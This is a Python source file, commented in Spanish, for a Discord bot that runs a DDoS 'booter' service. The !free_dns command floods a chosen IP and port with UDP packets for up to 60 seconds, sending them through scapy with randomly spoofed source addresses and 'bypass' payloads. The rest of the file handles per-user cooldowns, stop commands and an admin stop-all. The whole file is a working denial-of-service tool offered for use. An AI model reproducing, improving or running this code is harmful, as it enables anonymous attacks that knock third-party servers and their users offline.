import discord
from discord.ext import commands
import asyncio
import threading
import time
import random
from scapy.all import IP, UDP, Raw, send

TOKEN = 'TU_TOKEN_DISCORD'  # Reemplaza con tu token real

INTENTS = discord.Intents.default()
INTENTS.message_content = True

bot = commands.Bot(command_prefix='!', intents=INTENTS)

active_attacks = {}
cooldowns = {}
global_attack_running = False
admin_id = 1367535670410875070  # Cambia este ID por tu ID real

def udp_bypass_attack(ip, port, duration, stop_event):
    timeout = time.time() + duration
    payloads = [
        b"\x17\x00\x03\x2f" + random._urandom(1400),  # DNS query-style payload
        random._urandom(1450),
        b"\x13\x37" + random._urandom(1400),
        b"HEAD / HTTP/1.0\r\n\r\n" + random._urandom(300)
    ]

    while time.time() < timeout and not stop_event.is_set():
        try:
            spoofed_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            packet = IP(src=spoofed_ip, dst=ip, ttl=random.randint(64, 128)) / \
                     UDP(sport=random.randint(1024, 65535), dport=port) / \
                     Raw(load=random.choice(payloads))
            send(packet, verbose=False)
        except Exception:
            continue

@bot.event
async def on_ready():
    print(f'✅ Bot conectado como {bot.user.name}')

async def launch_udp_bypass(ctx, ip, port, duration, method_name):
    global global_attack_running

    if ip is None or port is None or duration is None:
        await ctx.send("❗ Uso correcto: `!free_dns <ip> <port> <time>` (máx 60s)")
        return

    if ip == "127.0.0.1":
        await ctx.send("🚫 No puedes atacar a `127.0.0.1`.")
        return

    if duration > 60:
        await ctx.send("⚠️ Tiempo máximo: 60 segundos.")
        return

    if ctx.author.id in active_attacks:
        await ctx.send("⛔ Ya estás ejecutando un ataque.")
        return

    if ctx.author.id in cooldowns:
        await ctx.send("⏳ Espera 30 segundos para usar otro ataque.")
        return

    if global_attack_running:
        await ctx.send("⚠️ Ya hay un ataque global activo. Espera que finalice.")
        return

    stop_event = threading.Event()
    active_attacks[ctx.author.id] = stop_event
    global_attack_running = True

    embed = discord.Embed(
        title="🚀 Ataque Iniciado",
        description=(
            f"**Método:** `{method_name}`\n"
            f"**IP:** `{ip}`\n"
            f"**Puerto:** `{port}`\n"
            f"**Duración:** `{duration}s`\n"
            f"**Usuario:** <@{ctx.author.id}>"
        ),
        color=discord.Color.dark_red()
    )
    await ctx.send(embed=embed)

    thread = threading.Thread(target=udp_bypass_attack, args=(ip, port, duration, stop_event))
    thread.start()

    await asyncio.sleep(duration)

    if not stop_event.is_set():
        stop_event.set()
        await ctx.send(f"✅ Ataque finalizado para <@{ctx.author.id}>.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def free_dns(ctx, ip: str = None, port: int = None, duration: int = None):
    await launch_udp_bypass(ctx, ip, port, duration, "DNS-BYPASS")

@bot.command()
async def stop(ctx):
    if ctx.author.id not in active_attacks:
        await ctx.send("❌ No tienes un ataque activo.")
        return

    active_attacks[ctx.author.id].set()
    await ctx.send("🛑 Ataque detenido manualmente.")

    del active_attacks[ctx.author.id]
    cooldowns[ctx.author.id] = time.time()
    global global_attack_running
    global_attack_running = False

    await asyncio.sleep(30)
    cooldowns.pop(ctx.author.id, None)

@bot.command()
async def stopall(ctx):
    if ctx.author.id != admin_id:
        await ctx.send("❌ Solo el administrador puede detener todos los ataques.")
        return

    for event in active_attacks.values():
        event.set()
    active_attacks.clear()

    global global_attack_running
    global_attack_running = False

    await ctx.send("🛑 Todos los ataques han sido detenidos.")

@bot.command()
async def dhelp(ctx):
    embed = discord.Embed(title="📘 Ayuda de comandos", color=discord.Color.blue())
    embed.add_field(name="!free_dns <ip> <port> <time>", value="UDP real con técnicas de bypass (máx 60s)", inline=False)
    embed.add_field(name="!stop", value="Detiene tu ataque y activa cooldown", inline=False)
    embed.add_field(name="!stopall", value="Admin: detiene todos los ataques", inline=False)
    await ctx.send(embed=embed)

bot.run(TOKEN)
